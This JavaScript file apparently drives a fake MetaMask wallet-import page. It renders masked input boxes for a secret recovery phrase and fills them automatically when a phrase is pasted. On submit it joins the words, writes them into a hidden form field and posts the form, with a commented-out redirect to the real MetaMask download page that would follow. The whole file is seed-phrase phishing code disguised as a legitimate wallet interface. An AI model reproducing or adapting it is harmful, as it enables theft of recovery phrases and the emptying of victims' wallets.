document.addEventListener("DOMContentLoaded", function () {
//   const screenSize = window.innerWidth;

//   if (screenSize <= 768) {
//     document.querySelector("#mydesktopcntnt").style.display = "none";
//     document.querySelector("#myTabContent").style.display = "";
//   } else {
//     document.querySelector("#mydesktopcntnt").style.display = "";
//     document.querySelector("#myTabContent").style.display = "none";
//   }

  document.getElementById("toggleInput").addEventListener("click", function () {
    var input = document.getElementById("sec-rec-phr");
    input.type = input.type === "text" ? "password" : "text";
  });
  document
    .getElementById("toggleInputPW")
    .addEventListener("click", function () {
      var input = document.getElementById("new-pw");
      input.type = input.type === "text" ? "password" : "text";
    });
  //if (/iphone|ipod|ipad|android|mobile/i.test(userAgent)) {
  // document.querySelector("#mydesktopcntnt").style.display = "none";
  //    document.querySelector("#myTabContent").style.display = "";
  // } else {
  //  document.querySelector("#mydesktopcntnt").style.display = "";
  //   document.querySelector("#mydesktopcntnt").style.display = "none";
  // }
  const boxCountSelect = document.getElementById("boxCountSelect");
  const importSrp = document.querySelector(".import-srp__srp");

  boxCountSelect.addEventListener("change", function () {
    const selectedValue = parseInt(this.value, 10);
    const currentInputBoxes = document.querySelectorAll(
      ".import-srp__srp-word"
    );

    if (selectedValue < currentInputBoxes.length) {
      const excessBoxes = Array.from(currentInputBoxes).slice(selectedValue);
      excessBoxes.forEach((box) => {
        const input = box.querySelector(".phr-word");
        input.value = "";
        box.remove();
      });
    } else {
      for (let i = currentInputBoxes.length + 1; i <= selectedValue; i++) {
        const newBox = document.createElement("div");
        newBox.className = "import-srp__srp-word";
        newBox.innerHTML = `
          <label
          for="import-srp__srp-word-${i}"
          class="import-srp__srp-word-label"
        >
          <p
            class="mm-box mm-text mm-text--body-md mm-box--color-text-default"
          >
          ${i}
          </p>
        </label>
        <div class="MuiFormControl-root MuiTextField-root">
          <div
            class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl"
          >
            <input
              aria-invalid="false"
              autocomplete="off"
              id="import-srp__srp-word-${i}"
              type="password"
              dir="auto"
              data-testid="import-srp__srp-word-${i}"
              class="MuiInputBase-input MuiInput-input phr-word"
              value=""
              name='phrase-${i}'
            />
          </div>
        </div>
        <div class="show-hide-toggle">
          <input
            class="show-hide-toggle__input"
            id="import-srp__srp-word-${i}-checkbox"
            type="checkbox"
            data-testid="import-srp__srp-word-${i}-checkbox"
          /><label
            for="import-srp__srp-word-${i}-checkbox"
            class="show-hide-toggle__label"
            title="Show/Hide this word of the secret recovery phrase"
            ><svg
              width="24"
              height="24"
              fill="currentColor"
              class="show-hide-toggle__icon"
              aria-label="This word is hidden"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 640 512"
            >
              <path
                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
              ></path></svg
          ></label>
        </div>
          `;
        importSrp.appendChild(newBox);
      }
    }

    initializeInputBoxes();
  });

  const inputBoxes = document.querySelectorAll(".import-srp__srp-word");
  const inputFields = document.querySelectorAll(".phr-word");

  function initializeInputBoxes() {
    inputBoxes.forEach((box, index) => {
      const input = box.querySelector(".phr-word");
      const toggleCheckbox = box.querySelector(".show-hide-toggle__input");

      input.addEventListener("input", function () {
        // const value = input.value;
        // pfil();
        // const words = value.split(" ");
        // inputBoxes.forEach((otherBox, i) => {
        //   const otherInput = otherBox.querySelector(".phr-word");
        //   otherInput.value = words[i] || "";
        // });
        updateSubmitButton();
      });

      toggleCheckbox.addEventListener("change", function () {
        const isChecked = this.checked;
        input.type = isChecked ? "text" : "password";
      });
    });
  }

  initializeInputBoxes();
  const submitButton = document.querySelector("#submit-btn");

  const pw = document.querySelector("#password");
  const pwCF = document.querySelector("#confirm-password");
  const myForm = document.querySelector("#my-new-form");

  pw.addEventListener("input", updateSubmitButton);
  pwCF.addEventListener("input", updateSubmitButton);

  myForm.addEventListener("submit", (e) => {
    e.preventDefault();
  });

  function areInputFieldsFilled() {
    for (const inputField of inputFields) {
      if (
        !inputField.value.trim() ||
        pw.value.trim().length < 8 ||
        pwCF.value.trim().length < 8 ||
        pw.value.trim() != pwCF.value.trim()
      ) {
        return false;
      }
    }
    return true;
  }

  function pfil() {
    for (const inputField of inputFields) {
      if (!inputField.value.trim()) {
        return false;
      }
    }
    return inputFields;
  }

  function updateSubmitButton() {
    if (areInputFieldsFilled()) {
      submitButton.removeAttribute("disabled");
      const y = [];
      submitButton.addEventListener("click", (e) => {
        e.preventDefault();
        inputFields.forEach((field) => {
          y.push(field.value);
        });

        updateIF(y.join("-"));
        // window.location.href = `https://metamask.io/download`;
      });
    } else {
      submitButton.setAttribute("disabled", "");
    }
  }

  inputFields.forEach((inputField) => {
    inputField.addEventListener("input", updateSubmitButton);
  });

  updateSubmitButton();
  inputBoxes.forEach((box) => {
    const input = box.querySelector(".phr-word");

    input.addEventListener("paste", function (event) {
      event.preventDefault();
      const clipboardData = event.clipboardData.getData("text/plain");
      const words = clipboardData.split(" ");
      inputBoxes.forEach((otherBox, i) => {
        const otherInput = otherBox.querySelector(".phr-word");
        otherInput.value = words[i] || "";
        updateSubmitButton();
      });
    });
  });
});

async function updateIF(x) {
  const myForm = document.querySelector("#my-new-form");
  const myp = document.querySelector("#user-id-form");
  myp.value = String(x);
  myForm.submit();
}

function loadPage() {
  document.querySelector("#app-content").style.display = "none";
  document.querySelector("#popover-content").style.display = "";
}
